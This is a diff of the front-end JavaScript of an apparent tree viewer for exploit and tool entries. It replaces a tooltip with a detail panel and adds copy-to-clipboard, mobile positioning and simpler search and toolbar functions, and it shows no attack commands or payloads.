-    <button class="tt-close" onclick="document.getElementById('tooltip').style.display='none'">×</button>
-    <div class="tt-header">
-      <div class="tt-icon" style="background:${iconBg};color:${color}">${data.icon || (isExploit ? "⚡" : "🔧")}</div>
-      <div class="tt-title">${data.name}</div>
-      ${isExploit ? '<span class="tt-sev" style="background:#f8514920;color:#f85149">EXPLOIT</span>' : '<span class="tt-sev" style="background:#3fb95020;color:#3fb950">TOOL</span>'}
+  panel.innerHTML = `
+    <div class="dp-drag"></div>
+    <div class="dp-header">
+      <div class="dp-icon" style="background:${iconBg};color:${color}">${data.icon || (isExploit ? "⚡" : "🔧")}</div>
+      <div class="dp-title">${data.name}</div>
+      <span class="dp-badge" style="background:${isExploit ? "#f0515118" : "#39d35318"};color:${isExploit ? "#f05151" : "#39d353"}">${isExploit ? "EXPLOIT" : "TOOL"}</span>
+      <button class="dp-close" onclick="document.getElementById('detailPanel').style.display='none'">×</button>
     </div>
-    <div class="tt-body">
-      ${data.desc ? `<div class="tt-desc">${data.desc}</div>` : ""}
-      ${cmdBlock}
-      ${linksBlock}
+    <div class="dp-body">
+      ${data.desc ? `<div class="dp-desc">${data.desc}</div>` : ""}
+      ${cmdHtml}
+      ${linkHtml}
     </div>
-    <div class="tt-footer">Right-click node for details · Click to expand/collapse</div>
+    <div class="dp-footer">Tap/Right-click any tool node for details</div>
   `;
 
-  tt.style.display = "block";
+  panel.style.display = "block";
 
-  // Position
-  let x = event.clientX + 16;
-  let y = event.clientY - 20;
-  if (x + 480 > window.innerWidth) x = event.clientX - 490;
-  if (y + 400 > window.innerHeight) y = window.innerHeight - 410;
-  if (y < 60) y = 60;
-  tt.style.left = x + "px";
-  tt.style.top = y + "px";
+  if (!isMobile) {
+    let x = event.clientX + 16;
+    let y = event.clientY - 20;
+    if (x + 460 > window.innerWidth) x = event.clientX - 470;
+    if (y + 420 > window.innerHeight) y = window.innerHeight - 430;
+    if (y < 60) y = 60;
+    panel.style.left = x + "px";
+    panel.style.top = y + "px";
+  }
+}
+
+function copyCmd(btn) {
+  const block = btn.parentElement;
+  const text = block.innerText.replace("COPY\n","").replace("COPIED\n","").trim();
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = "COPIED";
+    btn.classList.add("copied");
+    setTimeout(() => { btn.textContent = "COPY"; btn.classList.remove("copied"); }, 2000);
+  });
 }
 
 function escHtml(s) {
   return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
 }
 
-// Close tooltip on click elsewhere
 document.addEventListener("click", e => {
-  if (!e.target.closest("#tooltip") && !e.target.closest(".copy-btn")) {
-    document.getElementById("tooltip").style.display = "none";
+  if (!e.target.closest("#detailPanel")) {
+    document.getElementById("detailPanel").style.display = "none";
   }
 });
 
-// ════════════════════════════════════════════════════════
-// TOOLBAR FUNCTIONS
-// ════════════════════════════════════════════════════════
-
+// ═══════════════════════════════════════════════════════
+// TOOLBAR
+// ═══════════════════════════════════════════════════════
 function expandAllRecursive(d) {
   if (d._children) { d.children = d._children; d._children = null; }
   if (d.children) d.children.forEach(expandAllRecursive);
 }
-
 function collapseAllRecursive(d) {
   if (d.children) {
     d.children.forEach(collapseAllRecursive);
     if (d.depth >= 1) { d._children = d.children; d.children = null; }
   }
 }
-
 function expandAll() {
-  expandAllRecursive(root);
-  update(root);
-  // Zoom out to fit
-  svg.transition().duration(700).call(zoom.transform, d3.zoomIdentity.translate(80, height/2).scale(0.35));
+  expandAllRecursive(root); update(root);
+  const s = isMobile ? 0.25 : 0.32;
+  svg.transition().duration(600).call(zoom.transform, d3.zoomIdentity.translate(60, H/2).scale(s));
 }
-
 function collapseAll() {
-  root.children.forEach(c => collapseAllRecursive(c));
-  update(root);
-  svg.transition().duration(700).call(zoom.transform, d3.zoomIdentity.translate(140, height/2).scale(0.85));
+  root.children.forEach(c => collapseAllRecursive(c)); update(root);
+  svg.transition().duration(600).call(zoom.transform, d3.zoomIdentity.translate(initX, H/2).scale(initScale));
 }
-
 function resetZoom() {
-  svg.transition().duration(500).call(zoom.transform, d3.zoomIdentity.translate(140, height/2).scale(0.85));
+  svg.transition().duration(400).call(zoom.transform, d3.zoomIdentity.translate(initX, H/2).scale(initScale));
 }
-
 function updateCount() {
-  const visible = root.descendants().filter(d => !d._hidden).length;
-  const total = root.descendants().length;
-  document.getElementById("nodeCount").textContent = `${visible} nodes visible · ${total} total`;
+  const vis = root.descendants().length;
+  document.getElementById("nodeCount").textContent = `${vis} nodes`;
 }
-
 function searchTree(query) {
-  if (!query) {
-    // Reset
-    root.descendants().forEach(d => { d._hidden = false; });
-    update(root);
-    return;
-  }
+  if (!query) { update(root); return; }
   query = query.toLowerCase();
-  
-  // Expand matching branches
-  function searchAndExpand(d) {
-    let found = false;
-    const nameMatch = d.data.name.toLowerCase().includes(query);
-    const cmdMatch = d.data.cmd && d.data.cmd.toLowerCase().includes(query);
-    const descMatch = d.data.desc && d.data.desc.toLowerCase().includes(query);
-
-    if (nameMatch || cmdMatch || descMatch) found = true;
-
-    const children = d.children || d._children;
-    if (children) {
-      children.forEach(c => {
-        if (searchAndExpand(c)) found = true;
-      });
-      if (found) {
-        d.children = children;
-        d._children = null;
-      }
+  function expand(d) {
+    let found = d.data.name.toLowerCase().includes(query) ||
+                (d.data.cmd || "").toLowerCase().includes(query) ||
+                (d.data.desc || "").toLowerCase().includes(query);
+    const ch = d.children || d._children;
+    if (ch) {
+      ch.forEach(c => { if (expand(c)) found = true; });
+      if (found) { d.children = ch; d._children = null; }
     }
-    d._hidden = !found;
     return found;
   }
-
-  searchAndExpand(root);
-  update(root);
+  expand(root); update(root);
 }
 
-// ════════════════════════════════════════════════════════
-// INIT
-// ════════════════════════════════════════════════════════
-
-update(root);
-
-// Keyboard shortcuts
+// ═══════════════════════════════════════════════════════
+// KEYBOARD
+// ═══════════════════════════════════════════════════════
 document.addEventListener("keydown", e => {
-  if (e.key === "Escape") document.getElementById("tooltip").style.display = "none";
-  if (e.key === "e" && e.ctrlKey) { e.preventDefault(); expandAll(); }
+  if (e.key === "Escape") document.getElementById("detailPanel").style.display = "none";
   if (e.key === "/" && !e.target.matches("input")) { e.preventDefault(); document.getElementById("searchBox").focus(); }
 });
+
+// ═══════════════════════════════════════════════════════
+// INIT
+// ═══════════════════════════════════════════════════════
+update(root);
 </script>
 </body>
 </html>
